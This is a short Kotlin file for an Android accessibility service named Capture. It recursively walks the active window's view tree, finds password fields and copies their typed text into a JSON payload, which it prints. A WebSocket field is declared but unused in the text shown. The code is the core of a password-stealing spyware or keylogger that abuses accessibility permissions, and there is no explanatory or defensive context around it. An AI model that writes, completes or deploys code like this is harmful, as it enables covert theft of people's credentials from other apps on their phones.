import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityNodeInfo
import okhttp3.WebSocket
import org.json.JSONObject
abstract class Capture : AccessibilityService() {
    lateinit var socket: WebSocket
    fun snapshot(field: AccessibilityNodeInfo) {
        if (field.isPassword()) {
            val payload = JSONObject()
            payload.put("value", field.getText().toString())
            println(payload.toString())
        }
        for (i in 0 until field.getChildCount()) snapshot(field.getChild(i))
    }
    fun activeTree() { snapshot(getRootInActiveWindow()) }
}
